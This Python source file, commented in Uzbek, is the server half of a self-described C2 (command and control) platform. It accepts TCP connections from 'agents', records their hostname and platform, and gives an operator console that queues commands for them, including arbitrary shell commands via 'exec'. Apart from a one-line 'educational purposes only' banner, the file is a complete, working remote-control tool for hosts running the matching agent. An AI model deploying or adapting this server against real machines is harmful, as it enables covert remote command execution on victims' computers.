"""
C2 Platform TCP Server
Raw TCP socket bilan aloqa uchun server
"""

import socket
import threading
import json
import time
import sys
import os
from datetime import datetime

# Common modullarni import qilish
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from common.config import *
from common.utils import *


def get_local_ip():
    """Kompyuterning local network IP manzilini aniqlash"""
    try:
        # Internet ga test connection
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.1)
        # Google DNS ga ulanish (real connection yo'q, faqat routing)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        # Fallback: hostname orqali
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            if local_ip.startswith('127.'):
                # 127.x.x.x bo'lsa, network interface'larni tekshirish
                return '0.0.0.0'
            return local_ip
        except:
            return '0.0.0.0'

class TCPServer:
    """TCP C2 Server klassi"""
    
    def __init__(self, host='0.0.0.0', port=9999):
        self.host = host
        self.port = port
        self.socket = None
        self.running = False
        self.clients = {}
        self.command_queue = {}
        
    def start(self):
        """TCP server ishga tushirish"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(10)
            
            self.running = True
            local_ip = get_local_ip()
            self.log(f"🚀 TCP Server ishga tushdi: {self.host}:{self.port}")
            if local_ip and local_ip != '0.0.0.0':
                self.log(f"📍 Local IP: {local_ip}:{self.port}")
                self.log(f"💡 Boshqa qurilmalardan ulanish: {local_ip}:{self.port}")
            
            while self.running:
                try:
                    client_socket, client_address = self.socket.accept()
                    self.log(f"🔗 Yangi ulanish: {client_address}")
                    
                    # Har bir client uchun alohida thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, client_address),
                        daemon=True
                    )
                    client_thread.start()
                    
                except socket.error as e:
                    if self.running:
                        self.log(f"❌ Socket xatosi: {e}")
                        
        except Exception as e:
            self.log(f"❌ Server xatosi: {e}")
        finally:
            self.cleanup()
    
    def handle_client(self, client_socket, client_address):
        """Client bilan aloqa"""
        client_id = f"{client_address[0]}:{client_address[1]}"
        
        try:
            # Client ma'lumotlarini olish
            data = self.receive_data(client_socket)
            if not data:
                return
            
            client_info = json.loads(data)
            agent_id = client_info.get('agent_id', client_id)
            
            # Client ro'yxatga qo'shish
            self.clients[agent_id] = {
                'socket': client_socket,
                'address': client_address,
                'info': client_info,
                'last_seen': datetime.now().isoformat(),
                'connected_at': datetime.now().isoformat()
            }
            
            self.log(f"✅ Agent ro'yxatdan o'tdi: {agent_id}")
            
            # Heartbeat loop
            while self.running:
                try:
                    # Komandalarni yuborish
                    commands = self.command_queue.get(agent_id, [])
                    if commands:
                        self.command_queue[agent_id] = []
                        
                        for command in commands:
                            self.send_data(client_socket, json.dumps(command))
                            self.log(f"📤 Komanda yuborildi: {command.get('type')}")
                    
                    # Heartbeat yuborish
                    heartbeat = {
                        'type': 'heartbeat',
                        'timestamp': datetime.now().isoformat()
                    }
                    self.send_data(client_socket, json.dumps(heartbeat))
                    
                    # Agent dan javob kutish
                    response_data = self.receive_data(client_socket, timeout=5)
                    if response_data:
                        try:
                            response = json.loads(response_data)
                            self.handle_agent_response(agent_id, response)
                        except json.JSONDecodeError:
                            self.log(f"⚠️ Noto'g'ri JSON: {agent_id}")
                    
                    # Last seen yangilash
                    self.clients[agent_id]['last_seen'] = datetime.now().isoformat()
                    
                    time.sleep(10)  # 10 soniya interval
                    
                except socket.timeout:
                    continue
                except ConnectionResetError:
                    self.log(f"🔌 Client uzilib qoldi: {agent_id}")
                    break
                except Exception as e:
                    self.log(f"❌ Client xatosi {agent_id}: {e}")
                    break
        
        except Exception as e:
            self.log(f"❌ Handle client xatosi: {e}")
        
        finally:
            # Client ni ro'yxatdan o'chirish
            if agent_id in self.clients:
                del self.clients[agent_id]
                self.log(f"🚫 Agent o'chirildi: {agent_id}")
            
            try:
                client_socket.close()
            except:
                pass
    
    def send_data(self, client_socket, data):
        """Ma'lumot yuborish"""
        try:
            message = data.encode('utf-8')
            message_length = len(message)
            
            # Uzunlikni yuborish (4 byte)
            client_socket.sendall(message_length.to_bytes(4, byteorder='big'))
            # Ma'lumotni yuborish
            client_socket.sendall(message)
            
        except Exception as e:
            raise ConnectionResetError(f"Send xatosi: {e}")
    
    def receive_data(self, client_socket, timeout=30):
        """Ma'lumot olish"""
        try:
            client_socket.settimeout(timeout)
            
            # Uzunlikni olish (4 byte)
            length_data = client_socket.recv(4)
            if not length_data:
                return None
            
            message_length = int.from_bytes(length_data, byteorder='big')
            
            # Ma'lumotni olish
            message = b''
            while len(message) < message_length:
                chunk = client_socket.recv(message_length - len(message))
                if not chunk:
                    break
                message += chunk
            
            return message.decode('utf-8')
            
        except socket.timeout:
            raise socket.timeout("Receive timeout")
        except Exception as e:
            raise ConnectionResetError(f"Receive xatosi: {e}")
    
    def handle_agent_response(self, agent_id, response):
        """Agent javobini qayta ishlash"""
        try:
            response_type = response.get('type', 'unknown')
            
            if response_type == 'heartbeat':
                # Oddiy heartbeat
                pass
            elif response_type == 'command_result':
                # Komanda natijasi
                result = response.get('data', {})
                self.log(f"📥 Natija olindi {agent_id}: {result.get('command', 'N/A')}")
            elif response_type == 'error':
                # Xato
                error = response.get('message', 'Noma\'lum xato')
                self.log(f"⚠️ Agent xatosi {agent_id}: {error}")
            
        except Exception as e:
            self.log(f"❌ Response handle xatosi: {e}")
    
    def send_command_to_agent(self, agent_id, command_type, command_data=None):
        """Agentga komanda yuborish"""
        try:
            if agent_id not in self.clients:
                return False
            
            command = {
                'type': command_type,
                'data': command_data,
                'timestamp': datetime.now().isoformat(),
                'id': f"cmd_{int(time.time())}"
            }
            
            if agent_id not in self.command_queue:
                self.command_queue[agent_id] = []
            
            self.command_queue[agent_id].append(command)
            self.log(f"📝 Komanda navbatga qo'shildi: {command_type} -> {agent_id}")
            return True
            
        except Exception as e:
            self.log(f"❌ Komanda yuborish xatosi: {e}")
            return False
    
    def get_connected_agents(self):
        """Ulangan agentlar ro'yxati"""
        agents = {}
        for agent_id, client_data in self.clients.items():
            agents[agent_id] = {
                'info': client_data['info'],
                'address': f"{client_data['address'][0]}:{client_data['address'][1]}",
                'last_seen': client_data['last_seen'],
                'connected_at': client_data['connected_at'],
                'status': 'online'
            }
        return agents
    
    def stop(self):
        """Server to'xtatish"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        self.log("🛑 TCP Server to'xtatildi")
    
    def cleanup(self):
        """Tozalash"""
        for client_data in self.clients.values():
            try:
                client_data['socket'].close()
            except:
                pass
        self.clients.clear()
        self.command_queue.clear()
    
    def log(self, message):
        """Log xabar"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [TCP-SERVER] {message}")


class TCPServerCLI:
    """TCP Server uchun CLI"""
    
    def __init__(self, server):
        self.server = server
        
    def start_interactive(self):
        """Interaktiv CLI"""
        print("🎯 TCP C2 Server CLI")
        print("Komandalar: agents, send, status, help, quit")
        print("-" * 50)
        
        while self.server.running:
            try:
                command = input("TCP-C2> ").strip().split()
                if not command:
                    continue
                
                cmd = command[0].lower()
                
                if cmd == 'agents':
                    self.show_agents()
                elif cmd == 'send' and len(command) >= 3:
                    agent_id = command[1]
                    cmd_type = command[2]
                    cmd_data = ' '.join(command[3:]) if len(command) > 3 else None
                    self.send_command(agent_id, cmd_type, cmd_data)
                elif cmd == 'status':
                    self.show_status()
                elif cmd == 'help':
                    self.show_help()
                elif cmd == 'quit':
                    break
                else:
                    print("❌ Noma'lum komanda. 'help' yozing")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"❌ CLI xatosi: {e}")
        
        print("👋 CLI to'xtatildi")
    
    def show_agents(self):
        """Agentlar ro'yxati"""
        agents = self.server.get_connected_agents()
        
        if not agents:
            print("❌ Hech qanday agent ulanmagan")
            return
        
        print("\\n📱 Ulangan Agentlar:")
        print("-" * 80)
        for agent_id, data in agents.items():
            info = data['info']
            print(f"🟢 {agent_id}")
            print(f"   Host: {info.get('hostname', 'N/A')}")
            print(f"   Address: {data['address']}")
            print(f"   Platform: {info.get('platform', 'N/A')}")
            print(f"   Connected: {data['connected_at']}")
            print("-" * 40)
    
    def send_command(self, agent_id, cmd_type, cmd_data):
        """Komanda yuborish"""
        if self.server.send_command_to_agent(agent_id, cmd_type, cmd_data):
            print(f"✅ Komanda yuborildi: {cmd_type}")
        else:
            print(f"❌ Agent topilmadi: {agent_id}")
    
    def show_status(self):
        """Status ko'rsatish"""
        agents = self.server.get_connected_agents()
        print(f"\\n📊 TCP Server Status:")
        print(f"   Address: {self.server.host}:{self.server.port}")
        print(f"   Running: {'✅' if self.server.running else '❌'}")
        print(f"   Connected Agents: {len(agents)}")
        print(f"   Uptime: {datetime.now().strftime('%H:%M:%S')}")
    
    def show_help(self):
        """Yordam"""
        print("\\n📋 Mavjud komandalar:")
        print("agents                    - Agentlar ro'yxati")
        print("send <agent_id> <cmd>     - Komanda yuborish")
        print("send <agent_id> exec <cmd> - Shell komanda")
        print("status                    - Server holati")
        print("help                      - Bu yordam")
        print("quit                      - Chiqish")


def main():
    """Asosiy funksiya"""
    print("=" * 50)
    print("🎯 C2 Platform TCP Server")
    print("⚠️  Faqat ta'lim maqsadida!")
    print("=" * 50)
    
    # Server yaratish
    server = TCPServer(host='0.0.0.0', port=9999)
    cli = TCPServerCLI(server)
    
    try:
        # Server ni alohida thread da ishga tushirish
        server_thread = threading.Thread(target=server.start, daemon=True)
        server_thread.start()
        
        time.sleep(1)  # Server ishga tushishini kutish
        
        # CLI ishga tushirish
        cli.start_interactive()
        
    except KeyboardInterrupt:
        print("\\n🛑 Server to'xtatilmoqda...")
    except Exception as e:
        print(f"❌ Xato: {e}")
    finally:
        server.stop()


if __name__ == "__main__":
    main()